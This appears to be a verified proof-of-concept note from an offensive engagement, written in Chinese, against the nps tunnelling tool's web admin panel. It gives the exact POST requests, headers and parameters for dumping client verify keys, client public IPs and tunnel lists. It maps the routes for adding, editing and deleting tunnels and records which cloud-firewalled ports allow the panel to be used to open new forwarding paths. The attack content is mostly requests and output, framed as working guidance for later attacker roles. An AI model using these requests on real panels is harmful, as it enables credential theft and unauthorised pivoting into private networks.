# nps 管理端接口取数姿势：/client/list 与 /index/gettunnel 必须 POST（GET 返回模板页/空集），gettunnel 必须带 type

- **code**: nps-panel-post-only-apis
- **kind**: script
- **category**: info-leak
- **component**: ehang nps (web 管理端, beego AutoRouter)
- **severity**: info
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 203.0.113.119:8080 实测：GET /client/list=15010B 模板页、GET /index/gettunnel={"rows":[],"total":0}；改 POST 后分别拿到 787B 真实客户端 JSON（vkey/Addr/流量）与 16204B 隧道清单（total=10）。同一 POC 在 203.0.113.121:8080 亦适用。
- **path**: pocs/nps-panel-post-only-apis/poc.http
- **tags**: nps,取数姿势,POST,gettunnel,云安全组,内网穿透
- **created_at**: 2026-09-28T07:10:21.624Z
- **found_by**: exploit

## 描述

nps 管理端数据接口的取数姿势（必须 POST + gettunnel 带 type），以及新增隧道受云安全组限制的实测结论。避免后续角色用 GET 误判"面板里没有客户端/隧道"。

## 用法

```
python exp_nps_admin.py（POST 版）。核对面板内容时禁止用 GET 判断，否则会误判面板为空。
```

## 正文

```
# 坑点：nps 管理端的数据接口必须用 POST，GET 只会返回 HTML 模板页或空集
# 这是核实数据来源时踩出来的 —— 用 GET 会误判"面板里没有客户端/没有隧道"

GET  /client/list      -> 200, 15010B, HTML 模板页（只含 row.Client.VerifyKey 这类 JS 变量名）
GET  /index/gettunnel  -> 200, 30B,  {"rows": [], "total": 0}          # 假空集！

POST /client/list      -> 200, 787B, 真实 JSON：
     {"bridgePort":8024,"bridgeType":"tcp","ip":"203.0.113.119",
      "rows":[{"Id":2,"VerifyKey":"<vkey>","Addr":"<client 公网出口 IP>",
               "Status":true,"IsConnect":true,"NowConn":56,
               "Flow":{"ExportFlow":...,"InletFlow":...},"MaxTunnelNum":0,
               "Version":"0.26.10"}],"total":1}
     请求体： offset=0&limit=50&search=
     头：    X-Requested-With: XMLHttpRequest
             Content-Type: application/x-www-form-urlencoded

POST /index/gettunnel  -> 200, 16KB, 真实隧道清单（total=10）
     请求体必须带 type： offset=0&limit=100&type=tcp&client_id=&search=
     type 取值： tcp | udp | httpProxy | socks5 | secret | file | p2p | all
     注意： type=socks5 有时返回 502（接口不稳定），重试即可

# 路由真相：beego AutoRouter → /index/<MethodName 小写>、/client/<...>、/login/<...>
#   /index/gettunnel → IndexController.GetTunnel      （POST，参数 type/offset/limit/client_id/search）
#   /client/list     → ClientController.List          （POST=数据，GET=页面）
#   /index/add       → Add()      （GET=新增页表单，POST=真正新增隧道）
#   /index/edit|start|stop|del、/index/addhost|edithost|delhost
#
# 新增隧道的参数（校验只有 TestServerPort + MaxTunnelNum）：
#   port, server_ip, type(tcp/udp/socks5/httpProxy/secret/file/p2p), target, local_proxy,
#   remark, password, local_path, strip_pre, client_id
#
# 注意：新增的隧道即使面板显示 RunStatus=true，**外部也可能连不上** ——
#       目标云厂商安全组只放行既有端口，新端口是 drop 型超时（实测 31410 三次 False，对照 31401 True）。
#       所以"借面板新增映射"这条路只在能复用既有已放行端口时可行。

```
